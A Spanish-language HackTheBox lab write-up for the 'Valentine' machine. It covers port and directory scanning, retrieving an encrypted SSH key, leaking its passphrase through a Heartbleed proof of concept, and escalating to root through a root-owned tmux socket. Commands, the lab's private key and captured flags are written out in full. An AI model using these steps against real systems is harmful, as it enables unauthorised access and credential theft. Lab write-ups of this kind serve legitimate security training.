# WriteUp HackTheBox Valentine

[Nota]: esta maquina fue realizada según el WriteUp realizado por S4vitar

## Descripción de la máquina

![Valentine_Image](Images/Valentine.png)

La resolución de la máquina presenta las siguiente fases:

* Reconocimiento
    * nmap
* Explotación
* Escalada de privilegios

## Fase de Reconocimiento

Se realiza una prueba de ping para confirmar que haya conexión con la máquina

```console
ping 10.10.10.79 -c1
```

```
PING 10.10.10.79 (10.10.10.79) 56(84) bytes of data.
64 bytes from 10.10.10.79: icmp_seq=1 ttl=63 time=129 ms

--- 10.10.10.79 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 129.295/129.295/129.295/0.000 ms
```

Para identificar el sistema operativo usamos la utilidad proporcionada por S4vitar whichSystem.py[^1]

[^1]: la utilidad se puede descargar de <https://github.com/Akronox/WichSystem.py>

```console
whichSystem.py 10.10.10.79
```

```
10.10.10.79 (ttl -> 63): Linux
```

Se realiza una revisión de puertos con nmap con las siguientes opciones

* -p-: Para realizar el escaneo en todos los 65000 puertos TCP
* --open: Para reportar solamente los puertos que se encuentran abiertos
* -sS: TCP SYN port scan, este argumento se utiliza para realizar un escaneo rapido de puertos
* --min-rate: El argumento le exige a nmap realizar el escaneo con una tasa de paquetes por segundo no menor a la solicitada
* -vvv: triple verbose para mostrar más información
* -n: para que no realice resolución dns en el scaneo
* -Pn: Desabilita el descubrimiento del host a traves de ping
* -oG: exporta lo reportado en un archivo en formato grepeable

```console
sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.10.79 -oG nmap/allPorts
```

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-30 00:18 -04
Initiating Parallel DNS resolution of 1 host. at 00:18
Completed Parallel DNS resolution of 1 host. at 00:18, 0.10s elapsed
DNS resolution of 1 IPs took 0.10s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 00:18
Scanning 10.10.10.79 [65535 ports]
Discovered open port 80/tcp on 10.10.10.79
Discovered open port 443/tcp on 10.10.10.79
Discovered open port 22/tcp on 10.10.10.79
Completed SYN Stealth Scan at 00:18, 13.73s elapsed (65535 total ports)
Nmap scan report for 10.10.10.79
Host is up, received user-set (0.13s latency).
Scanned at 2022-08-30 00:18:13 -04 for 14s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.98 seconds
           Raw packets sent: 67701 (2.979MB) | Rcvd: 67610 (2.704MB)
```

Por comodidad usamos la utilidad proporcionada por S4vitar extractPorts la cual nos ayuda a revisar el archivo creado por nmap 'all Ports' y nos copia los puertos en la clipboard para su posterior uso; se adjunta la utilidad a continuación

```console
extractPorts () {
        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
        echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
        echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
        echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
        echo $ports | tr -d '\n' | xclip -sel clip
        echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
        /bin/bat extractPorts.tmp
        rm extractPorts.tmp

```

Ejecutamos el comando extractPorts

```console
extractPorts nmap/allPorts
```

```
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.79
   5   │     [*] Open ports: 22,80,443
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
```

Se realiza un nuevo escaneo con una serie de scripts básicos que nmap nos ofrece para ver las técnologias que corren por detrás

```console
nmap -sCV -p22,80,443  10.10.10.79 -oN nmap/targeted 
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-30 00:20 -04
Nmap scan report for 10.10.10.79
Host is up (0.13s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2022-08-30T04:21:21+00:00; +6s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 5s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.91 seconds
```

revisamos el servidor web con *whatweb*

```console
whatweb 10.10.10.79
```

```
http://10.10.10.79 [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.10.10.79], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]
```

ingresando al web server vemos que solmanete tiene una imagen con la que por el momento se ve que no se puede hacer nada

![index-page](Images/imagen01.png)

## Fase de Explotación

Por tanto realizamo un fuzzeo para buscar directorios

```console
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.79/FUZZ
```

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.79/FUZZ
Total requests: 220547

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000001:   200        1 L      2 W        38 Ch       "http://10.10.10.79/"                                                                                                     
000000002:   200        1 L      2 W        38 Ch       "index"                                                                                                                   
000000821:   301        9 L      28 W       308 Ch      "dev"
```

Ingresamos a la web http://10.10.10.79/dev y vemos que se tiene dos archivos

![dev-dir](Images/imagen02.png)

vemos que el archivo type_key es un archivo en formato hexadesimal, si lo descargamos y lo convertimos a texto vemos que tiene una llave ssh

```console
curl -s -X GET "http://10.10.10.79/dev/hype_key" | xxd -ps -r; echo
```

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

Por tanto lo descargamos y le damos los permisos respectivos

```console
curl -s -X GET "http://10.10.10.79/dev/hype_key" | xxd -ps -r > content/id_rsa
chmod 600 content/id_rsa
```

obtenemos el hash del archivo id_rsa

```console
python2 /usr/share/john/ssh2john.py  content/id_rsa > hash
```

Verificamos con john pero no encontramos nada

```console
john -w:$(locate rockyou.txt | head -n 1) hash
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate left, minimum 8 needed for performance.
0g 0:00:00:02 DONE (2022-08-30 00:53) 0g/s 4812Kp/s 4812Kc/s 4812KC/s *7¡Vamos!
Session completed
```

Revisamos con nmap algunos escripts

```console
locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
```

```
"auth"
"broadcast"
"brute"
"default"
"discovery"
"dos"
"exploit"
"external"
"fuzzer"
"intrusive"
"malware"
"safe"
"version"
"vuln"
```

revisamos con nmap vulnerabilidades en el puerto 443

```console
nmap --script "vuln and safe" -p443 10.10.10.79 -oN sslScan
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-30 00:57 -04
Nmap scan report for 10.10.10.79
Host is up (0.13s latency).

PORT    STATE SERVICE
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140407.txt 
|       http://cvedetails.com/cve/2014-0160/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      http://www.cvedetails.com/cve/2014-0224
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.securityfocus.com/bid/70574
|_      https://www.openssl.org/~bodo/ssl-poodle.pdf
```

Observamos que podemos realizar un heartblead attack <https://github.com/mpgn/heartbleed-PoC>

Realizamos varias veces un heartbleedattack de la siguiente forma hasta lograr ver información interesante en una variable $text

```console
python2 heartbleed-exploit.py 10.10.10.79
```

```
Connecting...
Sending Client Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Handshake done...
Sending heartbeat request with length 4 :
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response in file out.txt
WARNING : server returned more data than it should - server is vulnerable!
```

```console
cat out.txt | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
```

```
0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  [...]
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 0A  mV0aGVoeXBlCg==.
  0160: CF 46 B3 A0 61 32 0C 02 CD 52 F4 8A B3 A2 3B C5  .F..a2...R....;.
  0170: B8 A1 08 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................
  0200: 39 45 30 37 36 37 32 34 44 33 39 42 33 43 43 33  9E076724D39B3CC3
  [...]
  2060: 71 D4 00 00 00 00 00 00 00 00 00 00 00 00 00 00  q...............
```

Si decodificamos estos datos que se encuentran en base64 obtenemos una contraseña en texto claro

```console
echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d; echo
```

```
heartbleedbelievethehype
```

si la probamos con jhon, confirmamos que ya tenemos la contraseña de la id_rsa

```console
john -w:dictionary hash
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate left, minimum 8 needed for performance.
heartbleedbelievethehype (content/id_rsa)
1g 0:00:00:00 DONE (2022-08-30 01:13) 50.00g/s 50.00p/s 50.00c/s 50.00C/s heartbleedbelievethehype
Session completed
```

Por tanto utilizamos esa contraseña para autentificarnos

```console
ssh -i id_rsa hype@10.10.10.79
```

```
The authenticity of host '10.10.10.79 (10.10.10.79)' can't be established.
ECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.79' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ 
```

y ahí se puede ver la flag de usuario

```console
hype@Valentine:~/Desktop$ cat Desktop/user.txt
```

```
e6710a5464769fd5fcd216e076961750
```

## Fase de Escalación de Privilegios

Revisamos el historial del usuario y vemos que utiliza tmux

```console
hype@Valentine:~$ cat .bash_history 
```

```
exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess 
tmux a -t dev_sess 
tmux --help
tmux -S /.devs/dev_sess 
exit
```

Y como vemos que el socket creado por tmux es el propietario root

```console
hype@Valentine:~$ ls -lha /.devs/dev_sess
```

```
srw-rw---- 1 root hype 0 Aug 29 20:46 /.devs/dev_sess
```

ingresamos nuevamente al socket

```console
tmux -S /.devs/dev_sess
```

y nos encontramos como root as'i que podemos revisar la flag de root

```console
root@Valentine:/home/hype# cat /root/root.txt
```

```
f1bb6d759df1f272914ebbc9ed7765b2
```

## Estructura del directorio

```
Valentine
```


